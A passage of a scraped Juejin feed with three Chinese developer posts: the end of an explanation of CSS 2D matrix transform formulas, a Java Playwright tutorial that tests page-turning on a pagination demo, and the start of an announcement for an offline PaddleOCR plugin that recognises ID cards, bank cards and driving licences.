class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">100</span></span></span></span></span></p>
<p>效果：原始点 (0,100) 倾斜后 X 轴偏移 57.7px，Y 轴位置不变，呈现 X 轴向 Y 轴倾斜的效果，印证了 c*y 项的跨轴影响。</p>
<h2 data-id="heading-8">四、核心注意事项</h2>
<ol>
<li><strong>变换顺序影响公式结果</strong>：矩阵乘法不满足交换律，若同时存在缩放、旋转、平移，参数计算顺序（对应 transform 函数的右到左顺序）会改变 a、b、c、d 的最终值，进而影响 x'、y' 的计算结果。</li>
<li><strong>变换原点的间接影响</strong>：<code>transform-origin</code> 改变的是坐标原点位置，原始坐标 (x, y) 会以新原点为基准计算，最终通过公式得到的 x'、y' 也会对应偏移，但公式本身的计算逻辑不变。</li>
<li><strong>参数的组合性</strong>：a、b、c、d 四个参数并非独立作用，旋转、缩放+倾斜等复合变换中，它们会联动调整，最终通过公式共同决定坐标位置，而 e、f 始终作为独立平移项叠加。</li>
</ol>
<h2 data-id="heading-9">总结</h2>
<p>x' = a<em>x + c</em>y + e 与 y' = b<em>x + d</em>y + f 是 CSS 2D 矩阵变换的「底层执行逻辑」，核心价值是将缩放、旋转、倾斜、平移四种基础变换，通过「自身项+跨轴项+平移项」的组合，统一为坐标层面的计算。其中，跨轴项（c<em>y、b</em>x）是实现旋转、倾斜的关键，平移项（e、f）是齐次矩阵的核心应用，理解这两个公式，就能从根源上掌握 matrix 矩阵的灵活用法，不再局限于基础变换函数。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《刚刚问世》系列初窥篇-Java+Playwright自动化测试-41-翻页测试 （详细教程）]]></title>    <link>https://juejin.cn/post/7594350054091210794</link>    <guid>https://juejin.cn/post/7594350054091210794</guid>    <pubDate>2026-01-13T00:39:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054091210794" data-draft-id="7594350054091178026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《刚刚问世》系列初窥篇-Java+Playwright自动化测试-41-翻页测试 （详细教程）"/> <meta itemprop="keywords" content="前端,Java,测试"/> <meta itemprop="datePublished" content="2026-01-13T00:39:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北京_宏哥"/> <meta itemprop="url" content="https://juejin.cn/user/1961184475484631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《刚刚问世》系列初窥篇-Java+Playwright自动化测试-41-翻页测试 （详细教程）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1961184475484631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北京_宏哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T00:39:54.000Z" title="Tue Jan 13 2026 00:39:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.简介</h2>
<p>数据分页是一种将大量数据划分成多个页面以方便查看和处理的功能。当一个数据表格中包含了大量数据时，将其全部显示在同一页上会使页面变得非常拥挤和难以浏览。因此，将数据表格分成若干个子集，并将这些子集分别显示在不同的页面上，能够提高用户的浏览和操作效率。 但是对于分页测试，这种一般都是公共的方法系统中都写好了，这种一般出现是数据展示比较多的时候，会采取分页的方法，而且比较固定，一般是没有问题的，因此它非常适合自动化测试，但是如何使用playwright来进行翻页自动化测试了，宏哥今天就讲解和分享一下。</p>
<h2 data-id="heading-1">2.测试场景</h2>
<p>对分页来说，我们最感兴趣的和测试的无非就是下面几个信息：<br/>
（1）当前总共有多少页（因为有时候当前是6页但是点击下一个前边的消失后边的页码就会出现了，总数大于当前页数）<br/>
（2）当前是第几页<br/>
（3）是否可以上一页和下一页点击</p>
<h2 data-id="heading-2">3.自动化实战</h2>
<p>宏哥发现了一个有用的小网站，在这里可以找到各种各样的实例，宏哥就再也不用自己写demo了，网站地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jq22.com%2F" target="_blank" title="https://www.jq22.com/" ref="nofollow noopener noreferrer">www.jq22.com</a></p>
<h3 data-id="heading-3">3.1代码设计</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84c7815d3a804f78b36fddf3b2d4e119~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=SkrBzXEu7aS397IQTs7DgKF1uH0%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-4">3.2参考代码</h3>
<pre><code class="hljs language-ini" lang="ini">package com.bjhg.playwright<span class="hljs-comment">;</span>

import com.microsoft.playwright.Browser<span class="hljs-comment">;</span>
import com.microsoft.playwright.BrowserContext<span class="hljs-comment">;</span>
import com.microsoft.playwright.BrowserType<span class="hljs-comment">;</span>
import com.microsoft.playwright.Locator<span class="hljs-comment">;</span>
import com.microsoft.playwright.Page<span class="hljs-comment">;</span>
import com.microsoft.playwright.Playwright<span class="hljs-comment">;</span>

/**
 * @author 北京-宏哥
 * 
 * @公众号:北京宏哥（微信搜索，关注宏哥，提前解锁更多测试干货）
 * 
 * 《刚刚问世》系列初窥篇-Java+Playwright自动化测试-41-翻页测试 （详细教程） 
 *
 * 2025年12月31日
 */

public class Test_Page {
    
    public static void main(String<span class="hljs-section">[]</span> args) {
        // TODO Auto-generated method stub
        try (Playwright <span class="hljs-attr">playwright</span> = Playwright.create()) {
            //1.使用chromium浏览器，<span class="hljs-comment"># 浏览器配置，设置以GUI模式启动Chrome浏览器（要查看浏览器UI，在启动浏览器时传递 headless=false 标志。您还可以使用 slowMo 来减慢执行速度。</span>
            Browser <span class="hljs-attr">browser</span> = playwright.chromium().launch(new BrowserType.LaunchOptions().setHeadless(<span class="hljs-literal">false</span>).setSlowMo(<span class="hljs-number">300</span>))<span class="hljs-comment">;</span>
            //2.创建context
            BrowserContext <span class="hljs-attr">context</span> = browser.newContext()<span class="hljs-comment">;</span>
            //创建page
            Page <span class="hljs-attr">page</span> = context.newPage()<span class="hljs-comment">;</span>
            page.screenshot()<span class="hljs-comment">;</span>
            //3.浏览器访问demo
            page.navigate("https://www.jq22.com/demojq22ys/jquerypager20150821/")<span class="hljs-comment">;</span>
            Thread.sleep(300)<span class="hljs-comment">;</span>
            // 计算展示出总页数：获取所有li元素数量，并减去首尾导航按钮（首页、«、»、尾页）
            int <span class="hljs-attr">totalLiCount</span> = page.locator(<span class="hljs-string">"//*[@id='pager']/ul/li"</span>).count()<span class="hljs-comment">;</span>
            int <span class="hljs-attr">totalPages</span> = totalLiCount - <span class="hljs-number">4</span><span class="hljs-comment">; // 减去首页、上一个、下一个、尾页(如果存在)或占位符</span>
            System.out.println("Current Total page is: " + totalPages)<span class="hljs-comment">;</span>

            // 遍历所有分页元素
            Locator <span class="hljs-attr">allPageItems</span> = page.locator(<span class="hljs-string">"//*[@id='pager']/ul/li"</span>)<span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">4</span><span class="hljs-comment">; i &lt; allPageItems.count(); i++) {</span>
                // 点击第i个分页按钮（索引从1开始，但是网页的首页、上一页没有显示和第一页已经点击所以从第二页开始点击）
                page.locator("//div<span class="hljs-section">[@id='pager']</span>/ul/li<span class="hljs-section">["+i+"]</span>").click()<span class="hljs-comment">;</span>
                // 等待300毫秒，模拟操作间隔
                page.waitForTimeout(300)<span class="hljs-comment">;</span>
            }

            // 定位并获取当前激活页面的页码文本
            Locator <span class="hljs-attr">currentPageLocator</span> = page.locator(<span class="hljs-string">"#pager &gt;&gt; ul &gt;&gt; li.pgCurrent"</span>)<span class="hljs-comment">;</span>
            String <span class="hljs-attr">currentPageText</span> = currentPageLocator.textContent()<span class="hljs-comment">;</span>
            System.out.println("Current click page is: " + currentPageText)<span class="hljs-comment">;</span>
            Thread.sleep(1000)<span class="hljs-comment">;</span>
            System.out.println("Test Pass")<span class="hljs-comment">;</span>
            //5.关闭page
            page.close()<span class="hljs-comment">;</span>
            //6.关闭browser
            browser.close()<span class="hljs-comment">;</span>
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace()<span class="hljs-comment">;</span>
        }

    }

}
</code></pre>
<h3 data-id="heading-5">3.3运行代码</h3>
<p>1.运行代码，右键Run As-&gt;Java Application，就可以看到控制台输出，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/070fb35b5e2a4f198b700ca207e2bbce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=zmxDLRlDcncsllhfXeKCsp8oEh0%3D" alt="image" loading="lazy"/></p>
<p>2.运行代码后电脑端的浏览器的动作（访问demo，点击第二页，然后打印当前点击选中的页码）。如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fd400992564435aaa4c5481fb49a46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=xvXoeW%2B5pc2o6iFUi9%2B8g7tsNh0%3D" alt="GIF+2025-12-31+8-34-58" loading="lazy"/></p>
<h2 data-id="heading-6">4.小结</h2>
<p>到此翻页自动化测试就实现了，其实很简单的，难点就是定位元素，以及循环点击页码。好了，今天时间不是很早了，宏哥就讲解和分享到这里，感谢您耐心的阅读！！！今天是2025年的最后一天了，原估计没有打算发文，想着有始有终，还是水一篇吧（比较简单，望各位见谅），提前祝各位小伙伴或者童鞋们，新年大吉，福运加码，马上发财~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 开源一款基于 PaddleOCR 的纯离线 OCR 识别插件 | 支持身份证、银行卡、驾驶证识别]]></title>    <link>https://juejin.cn/post/7594315259462631459</link>    <guid>https://juejin.cn/post/7594315259462631459</guid>    <pubDate>2026-01-13T01:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594315259462631459" data-draft-id="7594262760940994594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 开源一款基于 PaddleOCR 的纯离线 OCR 识别插件 | 支持身份证、银行卡、驾驶证识别"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T01:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="菜喵007"/> <meta itemprop="url" content="https://juejin.cn/user/3349527784076185"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 开源一款基于 PaddleOCR 的纯离线 OCR 识别插件 | 支持身份证、银行卡、驾驶证识别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3349527784076185/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    菜喵007
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:30:06.000Z" title="Tue Jan 13 2026 01:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🚀 开源一款基于 PaddleOCR 的纯离线 OCR 识别插件 | 支持身份证、银行卡、驾驶证识别</h2>
<blockquote>
<p>不依赖任何云服务，所有识别在本地完成，隐私安全有保障！</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">前言</h3>
<p>在移动应用开发中，OCR 识别是一个常见需求，尤其是证件识别场景：身份证实名认证、银行卡绑定、驾驶证信息录入等。</p>
<p>然而，市面上大多数 OCR 方案都依赖云服务 API，存在以下问题：</p>
<ul>
<li>💰 <strong>成本高</strong> - 按调用次数收费，量大时费用惊人</li>
<li>🌐 <strong>需要网络</strong> - 离线场景无法使用</li>
<li>🔓 <strong>隐私风险</strong> - 敏感证件数据上传到第三方服务器</li>
</ul>
<p>为了解决这些痛点，我开发了 <strong>lf-OCR</strong> —— 一款基于 PaddleOCR 的<strong>纯离线 OCR 识别插件</strong>，专为 uni-app 多端开发设计。</p>
<hr/>
<h3 data-id="heading-2">✨ 核心特性</h3>









































<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td>🔒 <strong>纯离线</strong></td><td>所有模型和依赖本地化，无需网络即可使用</td></tr><tr><td>🚀 <strong>高性能</strong></td><td>基于 PaddleOCR，识别速度快、准确率高</td></tr><tr><td>🎯 <strong>中文优化</strong></td><td>专为中文场景优化，识别效果出色</td></tr><tr><td>📱 <strong>多平台</strong></td><td>支持 H5、App (Android/iOS)</td></tr><tr><td>🪪 <strong>证件识别</strong></td><td>内置身份证、银行卡、驾驶证解析模板</td></tr><tr><td>✅ <strong>智能验证</strong></td><td>自动验证证件有效性（校验码、有效期等）</td></tr><tr><td>🔄 <strong>自动识别</strong></td><td>智能判断证件正反面，无需手动指定</td></tr><tr><td>🔧 <strong>易于扩展</strong></td><td>支持自定义模型和识别模板</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">📦 技术架构</h3>
<pre><code class="hljs language-scss" lang="scss">lf-OCR
├── 核心引擎 (PaddleOCR + ONNX Runtime + OpenCV.js)
├── 证件解析模板 (身份证/银行卡/驾驶证/通用)
├── 校验工具 (身份证号/银行卡号/手机号等)
└── 格式化工具 (日期/金额/手机号等)
</code></pre>
<p>整个插件大小约 35MB，包含：</p>
<ul>
<li><strong>ppocr_det.onnx</strong> - 文字检测模型</li>
<li><strong>ppocr_rec.onnx</strong> - 文字识别模型</li>
<li><strong>OpenCV.js</strong> - 图像处理</li>
<li><strong>ONNX Runtime</strong> - 模型推理</li>
</ul>
<hr/>
<h3 data-id="heading-4">🎮 快速上手</h3>
<h4 data-id="heading-5">安装</h4>
<p>在 HBuilder 插件市场搜索 <code>lf-OCR</code> 导入，或手动复制到 <code>uni_modules</code> 目录。</p>
<h4 data-id="heading-6">基础使用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> lfOCR <span class="hljs-keyword">from</span> <span class="hljs-string">"@/uni_modules/lf-OCR/index.js"</span>;

<span class="hljs-comment">// 初始化引擎</span>
<span class="hljs-keyword">await</span> lfOCR.<span class="hljs-title function_">init</span>({
  <span class="hljs-attr">onProgress</span>: <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"加载进度:"</span>, msg),
});

<span class="hljs-comment">// 识别身份证</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> lfOCR.<span class="hljs-title function_">recognize</span>(imagePath, <span class="hljs-string">"idCard"</span>);

<span class="hljs-keyword">if</span> (result.<span class="hljs-property">valid</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"姓名:"</span>, result.<span class="hljs-property">name</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"身份证号:"</span>, result.<span class="hljs-property">idNumber</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"地址:"</span>, result.<span class="hljs-property">address</span>);
}
</code></pre>
<h4 data-id="heading-7">返回数据示例</h4>
<p><strong>身份证正面识别结果：</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"张三"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"gender"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"男"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"ethnicity"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"汉族"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"birthDate"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1990年01月01日"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"address"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"北京市朝阳区某某街道123号"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"idNumber"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"110101199001011234"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"valid"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"side"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"front"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">🪪 支持的证件类型</h3>
<h4 data-id="heading-9">1. 身份证识别</h4>
<p>自动判断正反面，提取完整信息：</p>
